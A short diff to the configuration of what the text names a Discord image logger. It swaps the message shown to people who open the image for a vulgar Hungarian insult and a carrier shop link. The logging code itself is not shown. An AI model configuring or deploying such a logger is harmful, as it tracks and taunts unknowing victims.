@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Jól Beszoptad a faszt öcskös. https://www.one.hu/okostelefonok?reszlet=30&tarifa=easy&c_source=google&c_medium=cpc&c_name=hu_24_ao_p_x_e_i_d_perform.mobile.handset.search.prospect..brand..generic.telefon", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
